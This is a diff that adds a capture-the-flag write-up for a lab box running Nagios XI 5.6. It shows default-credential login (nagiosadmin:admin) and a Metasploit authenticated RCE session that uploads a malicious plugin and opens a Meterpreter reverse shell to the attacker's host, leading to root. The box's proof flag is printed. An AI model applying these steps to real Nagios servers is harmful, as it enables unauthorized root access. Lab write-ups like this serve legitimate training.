@@ -68,4 +68,80 @@ PORT     STATE SERVICE    VERSION
 5667/tcp open  tcpwrapped
 ```
 
-Lot of stuff, http/https display the same website Nagios XI platform. Nagios is an open-source computer-software application that monitors systems, networks etc. I've 0 experience with nagios and nagios pentesting.
+Lot of stuff, http/https display the same website Nagios XI platform. Nagios is an open-source computer-software application that monitors systems, networks etc. I've 0 experience with nagios and nagios pentesting. If we press the "Access Nagios XI" button will re-direct us to login panel.
+
+![](https://i.imgur.com/NBOoRgI.png)
+
+Tried lot of stuff, `admin:admin` - `guest:guest` etc nothing. I googled "nagios default credentials" and i found that the default username is `nagiosadmin` so by guessing i found the password is `admin`. :sweat_smile:
+
+So we're in using this creds `nagiosadmin:admin`:
+
+![](https://i.imgur.com/wrAr3Fa.png)
+
+I wasted too much time finding a way to execute php code or something, but no luck. Then i noticed the version of nagios in the down left corner :
+
+![](https://i.imgur.com/k5yjqcD.png)
+
+I googled "nagios xi 5.6 exploit" and i found a metasploit one! [exploit](https://www.exploit-db.com/exploits/48191){:target="_blank"} Let's fire it up!
+
+```
+$ service postgresql start; msfconsole
+                         
+...
+
+msf5 > search type:exploit name:nagios
+
+Matching Modules
+================
+
+   #  Name                                                          Disclosure Date  Rank       Check  Description
+   -  ----                                                          ---------------  ----       -----  -----------
+   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
+```
+
+Let's add the right settings.
+
+```
+msf5 > use exploit/linux/http/nagios_xi_authenticated_rce
+
+...
+
+msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set PASSWORD admin
+PASSWORD => admin
+msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set RHOSTS 192.168.1.9
+RHOSTS => 192.168.1.9
+msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set LHOST eth0
+LHOST => 192.168.1.14
+msf5 exploit(linux/http/nagios_xi_authenticated_rce) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.14:4444 
+[*] Found Nagios XI application with version 5.6.0.
+[*] Uploading malicious 'check_ping' plugin...
+[*] Command Stager progress - 100.00% done (897/897 bytes)
+[+] Successfully uploaded plugin.
+[*] Executing plugin...
+[*] Waiting for the plugin to request the final payload...
+[*] Sending stage (3012516 bytes) to 192.168.1.9
+[*] Meterpreter session 1 opened (192.168.1.14:4444 -> 192.168.1.9:51506) at 2020-09-18 12:24:27 +0300
+[*] Deleting malicious 'check_ping' plugin...
+[+] Plugin deleted.
+
+meterpreter > getuid
+Server username: no-user @ ubuntu (uid=0, gid=0, euid=0, egid=0)
+meterpreter > shell
+Process 13165 created.
+Channel 1 created.
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@ubuntu:~# whoami;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Perfect! Let's read the flag now.
+
+```
+root@ubuntu:~# cat proof.txt
+SunCSR.Team.3.af6d45da1f1181347b9e2139f23c6a5b
+```
+
+Fun box, learnt some new things! :)
